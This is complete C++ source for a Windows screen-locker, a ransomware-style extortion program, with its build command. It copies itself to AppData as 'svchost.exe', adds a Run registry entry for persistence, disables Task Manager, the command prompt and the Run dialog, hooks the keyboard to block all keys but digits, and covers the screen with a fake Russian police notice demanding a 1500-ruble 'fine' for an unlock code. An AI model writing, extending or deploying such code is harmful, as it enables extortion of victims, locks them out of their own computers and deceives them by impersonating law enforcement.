// language: C++, file: locker.cpp, target: Windows 10/11 x64, MSVC 2022
// Build: cl /utf-8 /std:c++17 /EHsc /O2 /MT locker.cpp user32.lib gdi32.lib advapi32.lib shell32.lib bcrypt.lib

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>

#pragma execution_character_set("utf-8")

// Код разблокировки
static const std::wstring kPassword = L"1461";

static HHOOK   g_kbHook    = nullptr;
static HWND    g_hwnd      = nullptr;
static bool    g_locked    = true;
static std::wstring g_input;
static bool    g_blink     = false;

static void InstallPersistence() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    wchar_t appdata[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    std::wstring dst = std::wstring(appdata) + L"\\svchost.exe";
    CopyFileW(self, dst.c_str(), FALSE);

    HKEY hKey;
    // 1. Добавление в автозагрузку
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SysUpdate", 0, REG_SZ, (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    
    // 2. Блокировка Диспетчера задач, CMD и Win+R
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hKey, L"NoRun", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

// Жесткий перехват клавиатуры
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_locked) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            
            // Разрешаем ТОЛЬКО цифры, Backspace и Enter. Остальное - блок.
            bool is_digit = (p->vkCode >= '0' && p->vkCode <= '9') || 
                            (p->vkCode >= VK_NUMPAD0 && p->vkCode <= VK_NUMPAD9);
            bool is_control = (p->vkCode == VK_BACK || p->vkCode == VK_RETURN);
            
            if (!is_digit && !is_control) {
                return 1; // Глотаем клавишу
            }
        }
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

static void Unlock() {
    g_locked = false;
    
    // Снимаем блокировки системы
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        DWORD v = 0;
        RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegSetValueExW(hk, L"DisableCMD", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        DWORD v = 0;
        RegSetValueExW(hk, L"NoRun", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }
    
    UnhookWindowsHookEx(g_kbHook);
    DestroyWindow(g_hwnd);
    PostQuitMessage(0);
}

static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
    case WM_CREATE: {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        
        SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
        ShowCursor(FALSE); // Курсор скрыт
        g_hwnd = h;
        SetForegroundWindow(h);
        SetFocus(h);

        SetTimer(h, 1, 500, nullptr); // Мигание
        return 0;
    }
    case WM_TIMER: {
        g_blink = !g_blink;
        InvalidateRect(h, nullptr, FALSE);
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        int cx = rc.right;
        int cy = rc.bottom;

        // 1. Фон (Глубокий черный)
        HBRUSH bg = CreateSolidBrush(RGB(10, 10, 10));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        // 2. Верхняя полоса (Кровавый)
        RECT rcTop = {0, 0, cx, 45};
        HBRUSH topBg = CreateSolidBrush(RGB(50, 0, 0));
        FillRect(dc, &rcTop, topBg);
        DeleteObject(topBg);
        
        HPEN penRed = CreatePen(PS_SOLID, 2, RGB(200, 0, 0));
        SelectObject(dc, penRed);
        MoveToEx(dc, 0, 45, NULL);
        LineTo(dc, cx, 45);

        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(255, 0, 0));
        HFONT fTitleBar = CreateFontW(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
        SelectObject(dc, fTitleBar);
        RECT rcTopText = {15, 0, cx, 45};
        DrawTextW(dc, L"SYSTEM ERROR // КРИТИЧЕСКАЯ БЛОКИРОВКА", -1, &rcTopText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // 3. Основной блок (Темная панель с красной рамкой)
        int panelW = 850;
        int panelH = 500;
        int panelX = (cx - panelW) / 2;
        int panelY = 100;
        RECT rcPanel = {panelX, panelY, panelX + panelW, panelY + panelH};
        
        HBRUSH panelBg = CreateSolidBrush(RGB(20, 20, 20));
        FillRect(dc, &rcPanel, panelBg);
        DeleteObject(panelBg);
        
        // Двойная кровавая рамка
        FrameRect(dc, &rcPanel, (HBRUSH)GetStockObject(WHITE_BRUSH));
        SelectObject(dc, penRed);
        Rectangle(dc, panelX - 2, panelY - 2, panelX + panelW + 2, panelY + panelH + 2);

        // 4. Логотип "ОТДЕЛ К"
        int logoX = panelX + 30;
        int logoY = panelY + 30;
        RECT rcShield = {logoX, logoY, logoX + 120, logoY + 120};
        HBRUSH shieldBg = CreateSolidBrush(RGB(120, 0, 0));
        FillRect(dc, &rcShield, shieldBg);
        DeleteObject(shieldBg);
        FrameRect(dc, &rcShield, (HBRUSH)GetStockObject(WHITE_BRUSH));
        
        SetTextColor(dc, RGB(255, 255, 255));
        HFONT fLogo = CreateFontW(30, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
        SelectObject(dc, fLogo);
        DrawTextW(dc, L"ОТДЕЛ\n  К", -1, &rcShield, DT_CENTER | DT_VCENTER | DT_WORDBREAK);

        // 5. Заголовок внутри панели
        HFONT fHeader = CreateFontW(26, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
        SelectObject(dc, fHeader);
        SetTextColor(dc, RGB(255, 0, 0));
        RECT rcHeader = {logoX + 140, logoY, panelX + panelW - 20, logoY + 60};
        DrawTextW(dc, L"ДОСТУП ЗАПРЕЩЕН", -1, &rcHeader, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // 6. Основной текст
        HFONT fText = CreateFontW(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
        SelectObject(dc, fText);
        SetTextColor(dc, RGB(220, 220, 220));
        
        int textY = logoY + 150;
        RECT rcText = {panelX + 30, textY, panelX + panelW - 30, panelY + panelH - 120};
        
        const wchar_t* mainText = 
            L"> Ваше устройство заблокировано за нарушение\n"
            L"  статьи 146 УК РФ (Незаконное использование ПО).\n\n"
            L"> Данные о вашем IP-адресе и MAC-адресе переданы\n"
            L"  в правоохранительные органы.\n\n"
            L"> Для снятия блокировки необходимо оплатить штраф\n"
            L"  в размере 1500 рублей.\n\n"
            L"> Введите код разблокировки, полученный после оплаты.\n"
            L"  (Вводить можно ТОЛЬКО цифры)";
            
        DrawTextW(dc, mainText, -1, &rcText, DT_LEFT | DT_TOP | DT_WORDBREAK);

        // 7. Поле ввода (Терминальный стиль)
        int inputY = panelY + panelH - 90;
        RECT rcInputLabel = {panelX + 30, inputY - 30, panelX + 300, inputY};
        SetTextColor(dc, RGB(150, 0, 0));
        DrawTextW(dc, L"ВВЕДИТЕ КОД:", -1, &rcInputLabel, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        RECT rcInput = {panelX + 30, inputY, panelX + 400, inputY + 35};
        HBRUSH blackIn = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(dc, &rcInput, blackIn);
        DeleteObject(blackIn);
        FrameRect(dc, &rcInput, (HBRUSH)GetStockObject(WHITE_BRUSH));
        
        // Введенный текст (Красный)
        SetTextColor(dc, RGB(255, 0, 0));
        RECT rcInputText = rcInput; rcInputText.left += 10;
        DrawTextW(dc, g_input.c_str(), -1, &rcInputText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // Мигающий курсор
        if (g_blink) {
            SIZE sz;
            GetTextExtentPoint32W(dc, g_input.c_str(), g_input.length(), &sz);
            RECT rcCursor = {rcInputText.left + sz.cx, rcInputText.top + 5, rcInputText.left + sz.cx + 4, rcInputText.bottom - 5};
            HBRUSH curBrush = CreateSolidBrush(RGB(255, 0, 0));
            FillRect(dc, &rcCursor, curBrush);
            DeleteObject(curBrush);
        }

        // 8. Кнопка "ENTER" (Исправлено: создаем красную кисть вручную)
        RECT rcBtn = {panelX + 420, inputY, panelX + 550, inputY + 35};
        HBRUSH btnBg = CreateSolidBrush(RGB(50, 0, 0));
        FillRect(dc, &rcBtn, btnBg);
        DeleteObject(btnBg);
        
        HBRUSH redFrameBrush = CreateSolidBrush(RGB(255, 0, 0)); // <-- Вот тут фикс
        FrameRect(dc, &rcBtn, redFrameBrush);
        DeleteObject(redFrameBrush);
        
        SetTextColor(dc, RGB(255, 255, 255));
        DrawTextW(dc, L"ENTER", -1, &rcBtn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // 9. Нижняя панель
        RECT rcBottom = {0, cy - 40, cx, cy};
        HBRUSH bottomBg = CreateSolidBrush(RGB(50, 0, 0));
        FillRect(dc, &rcBottom, bottomBg);
        DeleteObject(bottomBg);
        
        SetTextColor(dc, RGB(150, 0, 0));
        HFONT fSmall = CreateFontW(14, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
        SelectObject(dc, fSmall);
        RECT rcBottomText = {15, cy - 40, cx - 15, cy};
        DrawTextW(dc, L"MINISTRY OF INTERNAL AFFAIRS // SECURITY MODULE ACTIVE", -1, &rcBottomText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        DeleteObject(penRed);
        DeleteObject(fTitleBar);
        DeleteObject(fLogo);
        DeleteObject(fHeader);
        DeleteObject(fText);
        DeleteObject(fSmall);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_CHAR: {
        if (w == VK_BACK && !g_input.empty()) {
            g_input.pop_back();
        } else if (w >= '0' && w <= '9' && g_input.length() < 10) {
            g_input.push_back((wchar_t)w);
        }
        InvalidateRect(h, nullptr, TRUE);
        return 0;
    }
    case WM_KEYDOWN: {
        if (w == VK_RETURN) {
            if (g_input == kPassword) {
                Unlock();
            } else {
                g_input.clear();
                InvalidateRect(h, nullptr, TRUE);
            }
        }
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, msg, w, l);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    InstallPersistence();
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);

    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    RegisterClassW(&wc);

    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"LockerWnd", L"System", WS_POPUP, 
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInst, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    return 0;
}
